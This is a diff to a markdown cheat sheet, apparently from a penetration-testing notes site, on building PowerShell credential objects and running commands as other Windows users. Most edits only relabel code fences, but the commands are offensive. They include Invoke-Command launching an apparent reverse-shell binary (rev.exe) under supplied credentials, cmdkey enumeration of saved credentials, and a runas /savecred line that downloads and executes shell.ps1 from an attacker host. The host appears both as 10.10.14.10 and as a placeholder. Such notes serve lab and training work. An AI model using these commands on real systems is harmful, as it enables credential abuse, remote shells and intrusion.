@@ -4,7 +4,6 @@ date: 2024-7-10
 tags: ["powershell", "cred object", "Windows", "runas"]
 ---
 
----
 ### Create credential object
 
 {{< tab set1 tab1 active >}}Method #1{{< /tab >}}
@@ -13,15 +12,15 @@ tags: ["powershell", "cred object", "Windows", "runas"]
 
 <div>
 
-```powershell
+```console
 $username = '<DOMAIN>\<USER>'
 ```
 
-```powershell
+```console
 $password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
 ```
 
-```powershell
+```console
 $cred = New-Object System.Management.Automation.PSCredential($username, $password)
 ```
 
@@ -32,23 +31,23 @@ $cred = New-Object System.Management.Automation.PSCredential($username, $passwor
 
 <div>
 
-```powershell
+```console
 $username = '<DOMAIN>\<USER>'
 ```
 
-```powershell
+```console
 $password = '<PASSWORD>'
 ```
 
-```powershell
+```console
 $secstr = New-Object -TypeName System.Security.SecureString
 ```
 
-```powershell
+```console
 $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
 ```
 
-```powershell
+```console
 $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
 ```
 
@@ -64,16 +63,16 @@ $cred = new-object -typename System.Management.Automation.PSCredential -argument
 
 <div>
 
-```powershell
+```console
 Invoke-Command -ScriptBlock { C:\ProgramData\rev.exe } -Credential $cred -Computer localhost
 ```
 
-```powershell
+```console
 # If error, try
 Invoke-Command -ScriptBlock { C:\ProgramData\rev.exe } -Credential $cred -Computer localhost -auth credssp
 ```
 
-```powershell
+```console
 # Invoke command with config
 Invoke-Command -ScriptBlock { C:\ProgramData\rev.exe } -Credential $cred -Computer localhost -ConfigurationName config_name
 ```
@@ -85,11 +84,11 @@ Invoke-Command -ScriptBlock { C:\ProgramData\rev.exe } -Credential $cred -Comput
 
 <div>
 
-```powershell
+```console
 new-pssession -computername . -credential $cred
 ```
 
-```powershell
+```console
 # Switch to new session
 enter-pssession 1
 ```
@@ -104,7 +103,7 @@ enter-pssession 1
 
 <div>
 
-```powershell
+```console
 cmdkey /list
 ```
 
@@ -114,9 +113,9 @@ cmdkey /list
 
 <div>
 
-```powershell
+```console
 # e.g. Upload and run a shell
-runas /user:<DOMAIN>\<USER> /savecred "powershell iex(new-object net.webclient).downloadstring('http://10.10.14.10/shell.ps1')"
+runas /user:<DOMAIN>\<USER> /savecred "powershell iex(new-object net.webclient).downloadstring('http://<LOCAL_IP>/shell.ps1')"
 ```
 
 </div>
